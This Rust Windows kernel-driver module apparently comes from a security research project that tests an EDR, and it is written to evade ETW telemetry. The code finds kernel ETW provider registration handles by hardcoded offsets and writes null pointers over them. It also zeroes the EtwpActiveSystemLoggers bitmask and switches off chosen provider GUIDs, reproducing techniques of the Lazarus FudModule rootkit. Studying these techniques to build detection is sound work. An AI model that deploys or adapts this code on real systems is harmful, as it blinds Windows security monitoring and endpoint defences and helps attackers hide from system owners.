//! ETW evasion module.
//! Source ref of combating techniques, see my EDR: https://github.com/0xflux/ferric-fox/

use core::{ffi::c_void, ptr::null};

use alloc::{
    collections::btree_map::BTreeMap,
    format,
    string::{String, ToString},
    vec::Vec,
};
use wdk::println;
use wdk_sys::{
    UNICODE_STRING,
    ntddk::{MmGetSystemRoutineAddress, RtlInitUnicodeString},
};

/// Patches the ETW Kernel table in memory preventing signals being emitted full stop from the kernel!
pub fn patch_etw_kernel_table() {
    let table = match get_etw_dispatch_table() {
        Ok(t) => t,
        Err(_) => {
            println!("[ferric-fox] [-] Failed to get ETW Table");
            return;
        }
    };

    // Overwrite the ETW table with null pointers
    for entry in table {
        unsafe {
            core::ptr::write_bytes(entry.1 as *mut c_void, 0, 8);
        };
    }

    println!("[ferric-fox] [+] bytes overwritten to null pointers to bypass kernel ETW signals.");
}

/// Resolves the relative offset to a symbol being searched for by directly reading kernel memory.
///
/// # Args
///
/// - `function_name`: The name of the function contained in ntoskrnl you wish to search for the symbol
/// - `offset`: The pre-calculated offset to the symbol from manual disassembly. The offset should be the instruction address
///   which IMMEDIATELY follows the 4 byte offset to the struct. See the note for a better explanation.
///
/// # Note
///
/// To accurately select the offset location of the search, you **must** choose the address immediately following the
/// 4 byte (DWORD) offset to  the symbol. For example with this disassembly:
///
///     nt!KeInsertQueueApc:
///     fffff802`7f280380 4c89442418         mov     qword ptr [rsp+18h], r8
///     fffff802`7f280385 4889542410         mov     qword ptr [rsp+10h], rdx
///     fffff802`7f28038a 489c               pushfq  
///     fffff802`7f28038c 53                 push    rbx
///     fffff802`7f28038d 55                 push    rbp
///     fffff802`7f28038e 56                 push    rsi
///     fffff802`7f28038f 57                 push    rdi
///     fffff802`7f280390 4154               push    r12
///     fffff802`7f280392 4155               push    r13
///     fffff802`7f280394 4156               push    r14
///     fffff802`7f280396 4157               push    r15
///     fffff802`7f280398 4883ec70           sub     rsp, 70h
///     fffff802`7f280399 83ec70             sub     esp, 70h
///     fffff802`7f28039a ec                 in      al, dx
///     fffff802`7f28039b 704c               jo      ntkrnlmp!KeInsertQueueApc+0x69 (fffff8027f2803e9)
///     fffff802`7f28039d 8b15b5dfc700       mov     edx, dword ptr [ntkrnlmp!EtwThreatIntProvRegHandle (fffff8027fefe358)]
///     fffff802`7f2803a3 458be9             mov     r13d, r9d
///     ^ YOU WANT THE OFFSET IN BYTES TO THIS ADDRESS
///     fffff802`7f2803a6 488be9             mov     rbp, rcx
///
/// The function will then step back 4 bytes, as they are encoded in LE, to calculate the offset to the actual virtual address of the symbol .
fn resolve_relative_symbol_offset(function_name: &str, offset: usize) -> Result<*const c_void, ()> {
    let mut function_name_unicode = UNICODE_STRING::default();
    let string_wide: Vec<u16> = function_name.encode_utf16().collect();
    unsafe {
        RtlInitUnicodeString(&mut function_name_unicode, string_wide.as_ptr());
    }

    let function_address =
        unsafe { MmGetSystemRoutineAddress(&mut function_name_unicode) } as usize;
    if function_address == 0 {
        println!(
            "[ferric-fox] [-] Address of {function_name} was null whilst searching for the function address."
        );
        return Err(());
    }

    let offset_to_next_instruction = function_address + offset;
    let mut distance_to_symbol: i32 = 0;

    for i in 0..4 {
        // The starting point has us displaced immediately after the 4 byte offset; so we want to start with the
        // first byte and we then process each byte in the DWORD.
        // We calculate a pointer to the byte we want to read as a u32 (so it can be shifted into a u32). Then
        // shift it left by (i * 8) bits, and then OR them in place by setting the relevant bits.
        let ptr = unsafe { (offset_to_next_instruction as *const u8).sub(4 - i) };
        let byte = unsafe { core::ptr::read(ptr) } as i32;
        distance_to_symbol |= byte << (i * 8);
    }

    // Calculate the actual virtual address of the symbol we are hunting..
    let symbol = offset_to_next_instruction as isize + distance_to_symbol as isize;

    Ok(symbol as *const c_void)
}

pub fn get_etw_dispatch_table<'a>() -> Result<BTreeMap<&'a str, *const c_void>, ()> {
    // Construct the table of pointers to the kernel ETW dispatch objects. This will be stored in
    // a BTreeMap with the key of the dispatch symbol name, and a value of the pointer to the symbol.
    let mut dispatch_table: alloc::collections::BTreeMap<&str, *const c_void> = BTreeMap::new();

    let etw_threat_int_prov_reg_handle = resolve_relative_symbol_offset("KeInsertQueueApc", 35)?;
    dispatch_table.insert("EtwThreatIntProvRegHandle", etw_threat_int_prov_reg_handle);

    // EtwKernelProvRegHandle contiguously follows EtwThreatIntProvRegHandle
    dispatch_table.insert("EtwKernelProvRegHandle", unsafe {
        etw_threat_int_prov_reg_handle.add(8)
    });

    // EtwApiCallsProvRegHandle contiguously follows EtwKernelProvRegHandle
    dispatch_table.insert("EtwApiCallsProvRegHandle", unsafe {
        etw_threat_int_prov_reg_handle.add(8 * 2)
    });

    // Now we are out of contiguous addressing, so we need to search for the symbol
    let etwp_event_tracing_prov_reg_handle = resolve_relative_symbol_offset("EtwUnregister", 452)?;
    dispatch_table.insert(
        "EtwpEventTracingProvRegHandle",
        etwp_event_tracing_prov_reg_handle,
    );

    // EtwpPsProvRegHandle acts as a memory anchor to find the remainder of the table
    dispatch_table.insert("EtwpPsProvRegHandle", unsafe {
        etwp_event_tracing_prov_reg_handle.sub(0x20)
    });

    // The remainder can be calculated based off of pre-determined in memory offsets from EtwpPsProvRegHandle

    dispatch_table.insert("EtwpFileProvRegHandle", unsafe {
        etwp_event_tracing_prov_reg_handle.add(8 * 1)
    });
    dispatch_table.insert("EtwpDiskProvRegHandle", unsafe {
        etwp_event_tracing_prov_reg_handle.sub(0x30)
    });
    dispatch_table.insert("EtwpNetProvRegHandle", unsafe {
        etwp_event_tracing_prov_reg_handle.sub(0x28)
    });
    dispatch_table.insert("EtwLpacProvRegHandle", unsafe {
        etwp_event_tracing_prov_reg_handle.add(8 * 4)
    });
    dispatch_table.insert("EtwCVEAuditProvRegHandle", unsafe {
        etwp_event_tracing_prov_reg_handle.add(8 * 5)
    });
    dispatch_table.insert("EtwAppCompatProvRegHandle", unsafe {
        etwp_event_tracing_prov_reg_handle.sub(0x10)
    });
    dispatch_table.insert("EtwpMemoryProvRegHandle", unsafe {
        etwp_event_tracing_prov_reg_handle.sub(0x8)
    });
    dispatch_table.insert("EtwCpuPartitionProvRegHandle", unsafe {
        etwp_event_tracing_prov_reg_handle.add(0x30)
    });
    dispatch_table.insert("EtwCpuStarvationProvRegHandle", unsafe {
        etwp_event_tracing_prov_reg_handle.add(0x10)
    });
    dispatch_table.insert("EtwSecurityMitigationsRegHandle", unsafe {
        etwp_event_tracing_prov_reg_handle.add(0x18)
    });

    println!("Dispatch table:");
    for item in &dispatch_table {
        if !(*item.1).is_null() {
            // SAFETY: Null pointer of the inner pointer is checked above; we can guarantee at this point that the original pointer
            // in item.1 is valid, thus the question only remains of the inner pointer.
            let inner_ptr: *const EtwRegEntry = unsafe { *(*item.1 as *const *const EtwRegEntry) };

            if inner_ptr.is_null() {
                println!("Symbol {}: inner pointer is null/ {:?}", item.0, inner_ptr);
                continue;
            }

            // SAFETY: Pointer dereference checked above
            let etw_reg_entry: &EtwRegEntry = unsafe { &*inner_ptr };
            let actual_guid_entry: *const GuidEntry =
                etw_reg_entry.p_guid_entry as *const GuidEntry;
            if actual_guid_entry.is_null() {
                println!("Symbol {}: p_guid_entry is null", item.0);
                continue;
            }

            // SAFETY: Pointer dereference checked above
            let raw_guid = unsafe { (*actual_guid_entry).guid };
            println!(
                "Symbol: {}, raw: {:p}, _ETW_REG_ENTRY address: {:p}, GUID address: {:p}, GUID: {}",
                item.0,
                *item.1,
                etw_reg_entry as *const EtwRegEntry,
                actual_guid_entry,
                raw_guid.to_string(),
            );
        }
    }
    Ok(dispatch_table)
}

/// https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_ETW_REG_ENTRY
#[repr(C)]
#[derive(Copy, Clone, Debug, Eq, PartialEq)]
struct EtwRegEntry {
    unused_0: ListEntry,
    unused_1: ListEntry,
    p_guid_entry: *const GuidEntry,
    // we dont care about the rest of the fields
}

/// https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_ETW_GUID_ENTRY
#[repr(C)]
#[derive(Copy, Clone, Debug, Eq, PartialEq)]
struct GuidEntry {
    guid_list: ListEntry,
    unused_1: ListEntry,
    unused_2: i64,
    guid: GUID,
    unused_3: [u8; 0x28],
    provider_enable_info: TraceEnableInfo,
}

#[repr(C)]
#[derive(Debug, Copy, Clone, Eq, PartialEq)]
struct TraceEnableInfo {
    is_enabled: u32,
}

#[repr(C)]
#[derive(Debug, Copy, Clone, Eq, PartialEq)]
pub struct GUID {
    data_1: u32,
    data_2: u16,
    data_3: u16,
    data_4: [u8; 8],
}

impl GUID {
    /// Converts GUID bytes to a prettified hex encoded string in GUID format
    fn to_string(&self) -> String {
        format!(
            "{:08X}-{:04X}-{:04X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}",
            self.data_1,
            self.data_2,
            self.data_3,
            self.data_4[0],
            self.data_4[1],
            self.data_4[2],
            self.data_4[3],
            self.data_4[4],
            self.data_4[5],
            self.data_4[6],
            self.data_4[7]
        )
    }
}

#[repr(C)]
#[derive(Copy, Clone, Debug, Eq, PartialEq)]
struct ListEntry {
    flink: *const c_void,
    blink: *const c_void,
}

#[derive(Debug)]
enum EtwMonitorError {
    NullPtr,
    SymbolNotFound,
}

/// Monitor the system logger bitmask as observed to be exploited by Lazarus in their FudModule rootkit.
///
/// This function monitors abuse of teh _ETW_SILODRIVERSTATE.SystemLoggerSettings.EtwpActiveSystemLoggers bitmask.
pub fn clear_system_logger_bitmask() {
    let address = resolve_relative_symbol_offset("EtwSendTraceBuffer", 78)
        .expect("[ferric-fox] [-] Unable to resolve function EtwSendTraceBuffer")
        as *const *const EtwSiloDriverState;

    if address.is_null() {
        println!("[ferric-fox] [-] Pointer to EtwSiloDriverState is null");
        return;
    }

    // SAFETY: Null pointer checked above
    if unsafe { *address }.is_null() {
        println!("[ferric-fox] [-] Address for EtwSiloDriverState is null");
        return;
    }

    // Calculate the offset in memory to the bitmask so we can disable it.
    let address_of_silo_driver_state_struct = unsafe { *address } as usize;
    let logger_addr = address_of_silo_driver_state_struct + 0x1098;
    let addr = logger_addr as *mut u32;

    // SAFETY: Pointer is valid based off of calculations
    unsafe { core::ptr::write(addr, 0) };

    println!("[ferric-fox] [+] Successfully patched EtwpActiveSystemLoggers to 0");
}

/// Disables a single GUID as how the Lazarus rootkit works
/// https://decoded.avast.io/janvojtesek/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day/
pub fn disable_single_guid() -> Result<(), ()> {
    let address = resolve_relative_symbol_offset("EtwSendTraceBuffer", 78)
        .expect("[ferric-fox] [-] Unable to resolve function EtwSendTraceBuffer")
        as *const *const EtwSiloDriverState;

    if address.is_null() {
        println!("[ferric-fox] [-] Pointer to EtwSiloDriverState is null");
        return Err(());
    }

    // SAFETY: Null pointer checked above
    if unsafe { *address }.is_null() {
        println!("[ferric-fox] [-] Address for EtwSiloDriverState is null");
        return Err(());
    }

    // SAFETY: Null pointer checked above
    let first_hash_address = &(unsafe { &**address }.guid_hash_table);

    for i in 0..64 {
        let hash_bucket_entry =
            unsafe { first_hash_address.as_ptr().offset(i) } as *const *mut GuidEntry;
        if hash_bucket_entry.is_null() {
            println!("[ferric-fox] [i] Found null pointer whilst traversing list at index: {i}");
            continue;
        }

        if unsafe { *hash_bucket_entry }.is_null() {
            println!(
                "[ferric-fox] [i] Found null INNER pointer whilst traversing list at index: {i}"
            );
            continue;
        }

        // Add the current outer entry to the map
        let guid_entry = unsafe { &mut **hash_bucket_entry };

        // Look for other GUID entries under this bucket by traversing the linked list until we get back to
        // the beginning
        let first_guid_entry = guid_entry.guid_list.flink as *const GuidEntry;
        let mut current_guid_entry: *const GuidEntry = null();
        while first_guid_entry != current_guid_entry {
            // Assign the first guid to the current in the event its the first iteration, aka the current is
            // null from the above initialisation.
            if current_guid_entry.is_null() {
                current_guid_entry = first_guid_entry;
            }

            if current_guid_entry.is_null() {
                println!("[ferric-fox] [-] Current GUID entry is null, which is unexpected.");
                break;
            }

            // Search for a GUID to use as a use case, one of the ones that lazarus did silence in their rootkit
            // we will choose 555908d1-a6d7-4695-8e1e-26931d2012f4
            // IOC source: https://github.com/avast/ioc/blob/master/FudModule/README.md
            if unsafe { *current_guid_entry }.provider_enable_info.is_enabled != 0
                && unsafe { *current_guid_entry }.guid.to_string().to_ascii_lowercase()
                    == "555908d1-a6d7-4695-8e1e-26931d2012f4".to_string()
            || unsafe { *current_guid_entry }.provider_enable_info.is_enabled != 0
                && unsafe { *current_guid_entry }.guid.to_string().to_ascii_lowercase()
                    == "EFB251E4-D454-4A02-B126-7FBB9D3991C3".to_string().to_ascii_lowercase()
            {
                println!(
                    "Altering Lazarus abused GUID entry with non-zero value: {:08b}, GUID: {}",
                    unsafe { *current_guid_entry }.provider_enable_info.is_enabled,
                    unsafe { *current_guid_entry }.guid.to_string()
                );

                unsafe {
                    (*(current_guid_entry as *mut GuidEntry)).provider_enable_info.is_enabled = 0u32;
                }
                
                println!(
                    "Finished altering Lazarus abused GUID entry with non-zero value: {:08b}, GUID: {}. Address of GUID {:p}",
                    unsafe { *current_guid_entry }.provider_enable_info.is_enabled,
                    unsafe { *current_guid_entry }.guid.to_string(),
                    current_guid_entry,
                );
            }

            // Walk to the next GUID item
            // SAFETY: Null pointer dereference checked at the top of while loop
            current_guid_entry =
                unsafe { (*current_guid_entry).guid_list.flink as *const GuidEntry };
        }
    }

    Ok(())
}

/// https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_ETW_SILODRIVERSTATE
#[repr(C)]
struct EtwSiloDriverState {
    unused_1: [u8; 0x1d0],
    guid_hash_table: [EtwHashBucket; 64],
    unused_2: [u8; 0xB8],
    settings: EtwSystemLoggerSettings,
    unused_3: [u8; 0x38],
}

/// https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_ETW_HASH_BUCKET
#[repr(C)]
#[derive(Debug)]
struct EtwHashBucket {
    list_head: ListEntry,
    unused: [u8; 0x28], // remaining space we dont need, but we do need them filling out
}

/// https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_ETW_SYSTEM_LOGGER_SETTINGS
#[repr(C)]
#[derive(Debug)]
struct EtwSystemLoggerSettings {
    unused: [u8; 0xf],
    active_system_loggers: u32,
    unused_2: [u8; 0x160],
}
